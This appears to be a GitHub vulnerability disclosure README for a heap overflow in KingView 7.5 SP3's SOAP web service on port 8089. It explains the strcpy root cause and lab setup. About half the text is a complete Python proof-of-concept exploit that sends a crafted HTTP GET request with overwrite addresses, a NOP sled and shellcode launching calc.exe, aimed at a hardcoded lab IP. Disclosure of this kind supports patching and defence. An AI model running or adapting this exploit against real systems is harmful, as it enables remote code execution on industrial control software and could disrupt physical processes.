# Kingview-7.5-sp3-heap-overflow-vulnerability
reference
Kingview7.5 sp3 Touchvew.exe that manages port 8089 webservice services uses the soap protocol.The strcpy() function is used when parsing http GET requests, which has a heap overflow vulnerability.

1. Install KingView7.5 SP3
2. Install the Configurator driver
3. Use the demo that comes with the program to switch to the development system.
4. Run any project as shown in the figure：

![1701959933669](https://github.com/hunagling/Kingview-7.5-sp3-heap-overflow-vulnerability/assets/30653530/062350f2-d53b-4e3f-8917-95b04d58ac4a)

   
![1701959679217](https://github.com/hunagling/Kingview-7.5-sp3-heap-overflow-vulnerability/assets/30653530/14e0c5e5-b0ae-45a2-a1c1-7da38148ef83)


Causes of vulnerabilities：
The cause of the vulnerability is that after parsing the HTTP get request, it enters the processing function of the get request, first a 0x100-sized heap block space is new, and then the strcpy function is used to copy strings, if there is no 0x00 in the character to truncate the copy of the strcpy function, it will cause the copied data to overflow the heap and form a heap overflow

![1701957529056](https://github.com/hunagling/Kingview-7.5-sp3-heap-overflow-vulnerability/assets/30653530/32160ecb-c9c2-4c18-a088-b6b46cfd9e3b)

Running on a physical machine poc.py the program will crash on its own after ejecting the calculator (the shellcode contains the heap block address)


Note: Because the program itself is multi-threaded, some occasional cases will cause the program to crash and the shellcode cannot be executed when the PreTranslateMessage function has not been called by the thread where the PreTranslateMessage is located, and other threads use functions such as free or malloc.

![711841f78c9fcb5487bc25b672638b4](https://github.com/hunagling/Kingview-7.5-sp3-heap-overflow-vulnerability/assets/30653530/f0b1eab6-7791-462d-a342-ad75ff2bcfc7)
![8feec4ba992d78bfc31de6ffa5fefbf](https://github.com/hunagling/Kingview-7.5-sp3-heap-overflow-vulnerability/assets/30653530/537e0c27-c221-4876-aef7-e8c9753b7d49)


python poc：
```
import os
import socket
import sys
import time

host = "192.168.160.135"
port = 8089

case1 = ("\x47\x45\x54\x20\x20\x20\x20\x39\x38\x37\x36\x35\x34\x33\x32\x31" \
+"0"*16+"A"*244+"\x1c\xd3\x16\x04"+"\x34\xd4\x16\x04"+"\x90"*10 +"\x90"*16 +
"\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B\xC4" \
"\x6A\x05\x50\xB8\x21\x2c\xdf\x7d\xFF\xD0\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" \
"\x20\x20\x20\x20\x20\x20\x20\x2f\x69\x6e\x64\x65\x78\x2e\x68\x74" \
"\x6d\x6c\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73" \
"\x74\x3a\x20\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x0d\x0a" \
"\x0d\x0a"
    )   

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(case1)
print "  [+] Send 1 "
s.close()
print  "success!"
```

Showcase the video

https://github.com/hunagling/Kingview-7.5-sp3-heap-overflow-vulnerability/assets/30653530/5fc96edc-971c-46dc-a6f0-b65ea1389879

